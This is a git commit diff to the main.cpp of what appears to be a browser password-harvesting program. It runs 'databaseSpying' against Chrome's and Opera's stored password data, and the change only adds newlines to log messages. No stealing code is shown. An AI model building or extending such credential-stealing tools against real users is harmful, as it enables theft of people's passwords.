00345ea287b260251104f1d716bebd7916b02a6d
Valentin Nasraty <valentin.nasraty@epitech.eu>
2018-11-21 19:34:18 +0100

    Update main.cpp

--- src/main.cpp
+++ src/main.cpp
@@ -8,11 +8,11 @@ int main(int ac, const char **av)
 	Log::logSomething("\n[Start new analyse]");
 	// Chrome
 	core.setBrowserType(BrowserPassword::BrowserType::CHROME);
-	Log::logSomething("\n\\ Launch Chrome analyse /");
+	Log::logSomething("\n\\ Launch Chrome analyse /\n");
 	core.databaseSpying();
 	// Opera
 	core.setBrowserType(BrowserPassword::BrowserType::OPERA);
-	Log::logSomething("\n\\ Launch Opera analyse /");
+	Log::logSomething("\n\\ Launch Opera analyse /\n");
 	core.databaseSpying();
 	Log::logSomething("\n[Analyse terminated]\n");
 	return (0);
